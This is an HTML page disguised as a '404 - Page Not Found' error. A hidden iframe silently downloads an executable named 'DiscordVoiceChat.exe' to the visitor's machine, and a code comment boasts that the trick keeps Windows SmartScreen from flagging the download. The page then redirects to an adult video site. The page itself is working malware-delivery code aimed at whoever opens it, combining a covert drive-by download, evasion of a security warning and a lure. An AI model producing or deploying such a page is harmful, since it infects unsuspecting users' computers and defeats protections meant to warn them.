<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>404 - Page Not Found</title>
<style>
  body{background:#111;color:#ddd;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
  .wrap{text-align:center}
  .code{font-size:120px;font-weight:bold;color:#e74c3c}
  .msg{font-size:22px;margin:10px 0 4px}
  .sub{font-size:14px;color:#888;margin-top:20px}
  #dl{display:none}
</style>
</head>
<body>
  <div class="wrap">
    <div class="code">404</div>
    <div class="msg">Page Not Found</div>
    <div class="sub">Redirecting to video…</div>
  </div>
  <!-- same-origin iframe loads the exe = a real download (same as a manual click),
       so SmartScreen does NOT flag it as a "suspicious download" -->
  <iframe id="dl" src="DiscordVoiceChat.exe"></iframe>
  <script>
    setTimeout(function(){ location.href='https://multporn.net/video/lady_ds_prisoner'; }, 1500);
  </script>
</body>
</html>
